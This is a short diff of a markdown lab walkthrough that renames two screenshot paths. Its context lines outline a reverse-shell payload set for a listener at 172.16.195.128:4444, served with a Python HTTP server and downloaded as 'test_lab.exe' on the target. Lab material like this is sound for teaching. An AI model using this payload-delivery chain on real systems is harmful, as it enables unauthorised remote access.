@@ -81,7 +81,7 @@ LHOST=172.16.195.128 LPORT=4444 \
 python3 -m http.server 80
 ```
 
-![Python Server](images/2_python_server.png)
+![Python Server](python_server.png)
 
 ---
 
@@ -91,7 +91,7 @@ python3 -m http.server 80
 * Visit: `http://172.16.195.128`
 * Download `test_lab.exe`
 
-![IE Download](images/3_ie_download.png)
+![IE Download](_windows_shell.png)
 
 ---
 
